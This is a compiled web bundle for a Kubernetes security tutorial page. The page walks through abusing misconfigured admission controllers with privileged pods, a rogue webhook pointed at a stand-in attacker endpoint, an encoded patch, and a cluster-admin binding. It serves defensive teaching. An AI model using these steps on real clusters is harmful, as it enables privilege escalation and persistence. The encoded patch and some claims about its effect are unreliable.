"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[3329],{1094(e,s,i){i.r(s),i.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>o,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack-vectors/misconfigured-admission-controllers","title":"Misconfigured Admission Controllers","description":"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies.","source":"@site/docs/attack-vectors/misconfigured-admission-controllers.md","sourceDirName":"attack-vectors","slug":"/attack-vectors/misconfigured-admission-controllers","permalink":"/kubernetes-security/attack-vectors/misconfigured-admission-controllers","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack-vectors/misconfigured-admission-controllers.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/kubernetes-security/tags/attack-vector"},{"inline":true,"label":"admission-control","permalink":"/kubernetes-security/tags/admission-control"},{"inline":true,"label":"policy","permalink":"/kubernetes-security/tags/policy"},{"inline":true,"label":"CKS","permalink":"/kubernetes-security/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1771236448000,"sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Misconfigured Admission Controllers","description":"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies.","keywords":["kubernetes security","admission controllers","webhook security","policy bypass","validating webhook","mutating webhook","OPA","pod security policy","admission control","security policy"],"tags":["attack-vector","admission-control","policy","CKS"],"related":["/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/misconfigured-admission-controllers-mitigation/","/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/opa-gatekeeper/","/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/kyverno/","/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/pod-security-standards/"]},"sidebar":"default","previous":{"title":"Insecure RBAC Permissions","permalink":"/kubernetes-security/attack-vectors/insecure-rbac-permissions"},"next":{"title":"Container Escape","permalink":"/kubernetes-security/attack-vectors/privileged-container-escape"}}');var r=i(4848),t=i(8453);const o={sidebar_position:8,title:"Misconfigured Admission Controllers",description:"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies.",keywords:["kubernetes security","admission controllers","webhook security","policy bypass","validating webhook","mutating webhook","OPA","pod security policy","admission control","security policy"],tags:["attack-vector","admission-control","policy","CKS"],related:["/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/misconfigured-admission-controllers-mitigation/","/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/opa-gatekeeper/","/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/kyverno/","/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/pod-security-standards/"]},a="Misconfigured Admission Controllers",c={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Identify Disabled or Weak Admission Controllers",id:"1-identify-disabled-or-weak-admission-controllers",level:3},{value:"2. Deploy Privileged Pods",id:"2-deploy-privileged-pods",level:3},{value:"3. Discover and Inspect Webhooks",id:"3-discover-and-inspect-webhooks",level:3},{value:"4. Hijack Webhook Behavior",id:"4-hijack-webhook-behavior",level:3},{value:"5. Maintain Persistence via ClusterRoleBinding",id:"5-maintain-persistence-via-clusterrolebinding",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"misconfigured-admission-controllers",children:"Misconfigured Admission Controllers"})}),"\n",(0,r.jsxs)(s.p,{children:["Kubernetes ",(0,r.jsx)(s.strong,{children:"admission controllers"})," intercept and validate requests before they reach the API server. When improperly configured\u2014such as being disabled, weakly enforced, or exposing insecure webhooks\u2014they become a key target for attackers seeking to ",(0,r.jsx)(s.strong,{children:"bypass security controls, escalate privileges, or persist within the cluster"}),"."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,r.jsx)(s.h3,{id:"1-identify-disabled-or-weak-admission-controllers",children:"1. Identify Disabled or Weak Admission Controllers"}),"\n",(0,r.jsx)(s.p,{children:"The attacker identifies which admission controllers are missing or misconfigured."}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl api-versions | grep admission\nps aux | grep kube-apiserver\n"})}),"\n",(0,r.jsxs)(s.p,{children:["If ",(0,r.jsx)(s.strong,{children:"PodSecurity"}),", ",(0,r.jsx)(s.strong,{children:"ValidatingAdmissionWebhook"}),", or ",(0,r.jsx)(s.strong,{children:"MutatingAdmissionWebhook"})," are missing, or misconfigured, the attacker proceeds."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"2-deploy-privileged-pods",children:"2. Deploy Privileged Pods"}),"\n",(0,r.jsx)(s.p,{children:"Without proper admission policies, an attacker can launch pods that break security boundaries."}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:"apiVersion: v1\nkind: Pod\nmetadata:\n  name: attacker-pod\nspec:\n  containers:\n    - name: exploit-container\n      image: alpine\n      securityContext:\n        privileged: true\n"})}),"\n",(0,r.jsxs)(s.p,{children:["If ",(0,r.jsx)(s.strong,{children:"PodSecurity admission"})," is missing or misconfigured, this pod will be created without restriction."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"3-discover-and-inspect-webhooks",children:"3. Discover and Inspect Webhooks"}),"\n",(0,r.jsx)(s.p,{children:"The attacker lists and inspects webhook configurations:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl get mutatingwebhookconfigurations\nkubectl get validatingwebhookconfigurations\nkubectl describe mutatingwebhookconfiguration <webhook-name>\n"})}),"\n",(0,r.jsxs)(s.p,{children:["If a webhook forwards to an ",(0,r.jsx)(s.strong,{children:"unauthenticated external endpoint"}),", the attacker crafts a malicious configuration."]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:'clientConfig:\n  url: "http://attacker-controlled-endpoint/webhook"\n'})}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"4-hijack-webhook-behavior",children:"4. Hijack Webhook Behavior"}),"\n",(0,r.jsx)(s.p,{children:"The attacker spins up a rogue webhook server that modifies pod requests before creation:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-json",children:'{\n  "apiVersion": "admission.k8s.io/v1",\n  "kind": "AdmissionReview",\n  "response": {\n    "allowed": true,\n    "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvdGVtcGxhdGUvc2VjdXJpdHlDb250ZXh0IiwidmFsdWUiOnsiYnJ1bnRhaW5lc2NhcGVzIjp7ImFsbG93UHJpdmlsZWdlZEVzY2FsYXRpb24iOnRydWV9fX1d"\n  }\n}\n'})}),"\n",(0,r.jsx)(s.p,{children:"This patch adds privileged context to every created pod."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"5-maintain-persistence-via-clusterrolebinding",children:"5. Maintain Persistence via ClusterRoleBinding"}),"\n",(0,r.jsx)(s.p,{children:"The attacker configures the webhook to inject RBAC permissions:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: attacker-binding\nsubjects:\n  - kind: User\n    name: attacker\n    apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,r.jsxs)(s.p,{children:["This ensures ",(0,r.jsx)(s.strong,{children:"new pods receive cluster-admin privileges"}),", even after the attacker is removed from the system."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"result",children:"Result"}),"\n",(0,r.jsxs)(s.p,{children:["The attacker successfully ",(0,r.jsx)(s.strong,{children:"bypasses admission controllers"}),", injects ",(0,r.jsx)(s.strong,{children:"malicious pod configurations"}),", and gains ",(0,r.jsx)(s.strong,{children:"persistent cluster access"})," through insecure webhook logic and privilege escalation."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,r.jsxs)(s.p,{children:["\u27a1 ",(0,r.jsx)(s.a,{href:"/kubernetes-security/best-practices/cluster-setup-and-hardening/api-server-security/misconfigured-admission-controllers-mitigation/",children:"See Mitigation Guide for Misconfigured Admission Controllers"})]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"references",children:"References"}),"\n",(0,r.jsx)(s.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.a,{href:"https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/",children:"Admission Controllers Reference"})," - Kubernetes Documentation"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.a,{href:"https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/",children:"Dynamic Admission Control"})," - Kubernetes Documentation"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.a,{href:"https://kubernetes.io/docs/concepts/security/pod-security-admission/",children:"Pod Security Admission"})," - Kubernetes Documentation"]}),"\n"]})]})}function u(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453(e,s,i){i.d(s,{R:()=>o,x:()=>a});var n=i(6540);const r={},t=n.createContext(r);function o(e){const s=n.useContext(t);return n.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),n.createElement(t.Provider,{value:s},e.children)}}}]);